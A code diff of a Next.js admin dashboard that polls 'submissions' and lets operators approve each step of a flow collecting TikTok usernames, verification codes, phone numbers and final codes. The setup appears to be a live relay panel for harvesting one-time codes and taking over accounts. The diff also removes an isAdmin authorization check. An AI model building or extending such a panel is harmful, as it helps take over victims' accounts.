@@ -19,7 +19,6 @@ import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import type { Submission, AdminUser } from '@/lib/types';
 import { cn } from '@/lib/utils';
 import { useAdminAuth } from '@/hooks/use-admin-auth';
-import { useRouter } from 'next/navigation';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from '@/components/ui/dropdown-menu';
 
@@ -27,8 +26,7 @@ import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigge
 type Step = 'tiktokUsername' | 'verificationCode' | 'phoneNumber' | 'finalCode';
 
 export default function AdminPage() {
-    const { adminUser, isAdmin, isMainAdmin, isLoading: isAuthLoading } = useAdminAuth();
-    const router = useRouter();
+    const { adminUser, isMainAdmin, isLoading: isAuthLoading } = useAdminAuth();
     
     const [submissions, setSubmissions] = useState<Submission[]>([]);
     const [admins, setAdmins] = useState<AdminUser[]>([]);
@@ -65,22 +63,22 @@ export default function AdminPage() {
     }, []);
 
     useEffect(() => {
-        if (adminUser && isAdmin) {
+        if (adminUser) {
             fetchData();
         }
-    }, [adminUser, isAdmin, fetchData]);
+    }, [adminUser, fetchData]);
     
     useEffect(() => {
-        if (adminUser && isAdmin) {
+        if (adminUser) {
             const interval = setInterval(() => {
                 fetchData();
             }, 5000);
             return () => clearInterval(interval);
         }
-    }, [adminUser, isAdmin, fetchData]);
+    }, [adminUser, fetchData]);
 
 
-    if (isAuthLoading && (!adminUser || !isAdmin)) {
+    if (isAuthLoading) {
          return (
              <main className="flex flex-1 flex-col items-center justify-center p-4 md:p-6 bg-muted/40">
                 <Loader2 className="h-8 w-8 animate-spin text-primary" />
@@ -95,10 +93,10 @@ export default function AdminPage() {
     const handleSubmissionStepApproval = async (id: string, step: Step, status: 'approved' | 'rejected') => {
         setUpdatingId(`${id}-${step}`);
         try {
-            const res = await fetch('/api/submissions', {
-                method: 'POST',
+            const res = await fetch(`/api/submissions/${id}`, {
+                method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id, step, status }),
+                body: JSON.stringify({ step, status }),
             });
 
             if (!res.ok) throw new Error(`Failed to update ${step}.`);
@@ -114,7 +112,7 @@ export default function AdminPage() {
         setUpdatingId(`admin-${id}`);
         try {
             const res = await fetch('/api/admins', {
-                method: 'POST',
+                method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ id, isVerified }),
             });
@@ -147,7 +145,7 @@ export default function AdminPage() {
         return <Badge variant="secondary" className="border-blue-200 bg-blue-100 text-blue-800">Sub-Admin</Badge>;
     }
     
-    const isDataLoading = isLoadingData;
+    const isDataLoading = isAuthLoading || isLoadingData;
     const totalSubmissions = submissions.length;
     const pendingSubmissions = submissions.filter(s => 
         s.tiktokUsernameStatus === 'pending' || 
